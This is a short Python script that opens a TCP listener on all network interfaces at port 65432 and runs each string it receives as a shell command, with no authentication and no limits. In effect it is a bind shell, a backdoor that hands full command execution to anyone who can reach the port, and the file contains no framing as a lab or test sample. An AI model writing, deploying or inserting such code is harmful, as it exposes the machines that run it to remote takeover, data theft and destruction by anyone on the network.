import socket
import subprocess

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 65432))
        s.listen()
        print("Waiting for commands...")
        conn, addr = s.accept()
        with conn:
            print('Connected by', addr)
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                command = data.decode()
                subprocess.run(command, shell=True)

if __name__ == "__main__":
    start_server()